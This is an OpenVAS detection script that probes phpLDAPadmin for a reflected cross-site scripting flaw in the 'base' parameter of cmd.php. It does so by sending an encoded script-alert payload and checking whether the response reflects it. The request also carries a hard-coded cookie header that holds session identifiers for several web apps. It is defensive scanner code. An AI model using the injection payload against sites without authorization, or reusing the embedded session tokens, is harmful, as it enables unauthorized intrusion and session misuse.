###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpldapadmin_51793.nasl 12 2013-10-27 11:15:33Z jan $
#
# phpLDAPadmin 'base' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "phpLDAPadmin is prone to a cross-site scripting vulnerability because
it fails to properly sanitize user-supplied input.

An attacker may leverage this issue to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This may allow the attacker to steal cookie-based authentication
credentials and launch other attacks.

phpLDAPadmin 1.2.2 is affected; other versions may also be vulnerable.";

tag_solution = "Updates are available. Please see the references for more details.";

if (description)
{
 script_id(103409);
 script_bugtraq_id(51793);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"2.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");

 script_name("phpLDAPadmin 'base' Parameter Cross Site Scripting Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51793");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/phpldapadmin/develop");
 script_xref(name : "URL" , value : "http://phpldapadmin.sourceforge.net/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521450");

 script_tag(name:"risk_factor", value:"Medium");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-02-02 12:25:56 +0100 (Thu, 02 Feb 2012)");
 script_description(desc);
 script_summary("Determine if installed phpLDAPadmin is vulnerable to xss");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("phpldapadmin_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("phpldapadmin/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"phpldapadmin"))exit(0);
host = get_host_name();

req = string(
"GET ",dir,"/cmd.php?cmd=query_engine&server_id=1&query=none&format=list&showresults=na&base=%3Cscript%3Ealert(%27openvas-xss-test%27)%3C/script%3E&scope=sub&filter=objectClass%3D*%20display_attrs=cn%2C+sn%2C+uid%2C+postalAddress%2C+telephoneNumberorderby=&size_limit=50&search=Search HTTP/1.1\r\n",
"Host: ",host,"\r\n",
"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:9.0.1) Gecko/20100101 OpenVAS/4.0.1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
"Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
"DNT: 1\r\n",
"Connection: keep-alive\r\n",
"Cookie: MANTIS_VIEW_ALL_COOKIE=67; MANTIS_PROJECT_COOKIE=4; MANTIS_STRING_COOKIE=e2b933304c6242d91fb394a2f733937a1cf88a74122952145049768972ceb53d; MOIN_SESSION=2a7trenkqhiu13x4817peli2ui132bde; PHPSESSID=95a33614f6325aeb9535561d1439fd78; MANTIS_BUG_LIST_COOKIE=19745%2C15286%2C19737%2C19263%2C19678%2C19738%2C19477%2C19573%2C17051%2C19298%2C19464%2C19462%2C17669%2C19416%2C19394%2C19332%2C19020%2C19095%2C19019%2C19008%2C17310%2C9976%2C18813%2C14634%2C6747%2C8015%2C17793%2C12720%2C16040%2C18793%2C18794%2C18755%2C18754%2C18753%2C14356%2C18750%2C18749%2C18182%2C17621%2C17040%2C13856%2C13836%2C18214%2C12721%2C10290%2C18591%2C18550%2C18541%2C18512%2C18511; OpenEMR=a7igkni3o3sraosnspu2os9h2frevoqt; 5d89dac18813e15aa2f75788275e3588=b704913c41d8ae6472b7ec7a6503c413;\r\n\r\n");

 result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

 if(result =~ "HTTP/1.[0-9] 200" && egrep(pattern:"<script>alert\('openvas-xss-test'\)</script>",string:result)) {
   security_warning(port:port);
   exit(0);
 }

exit(0);
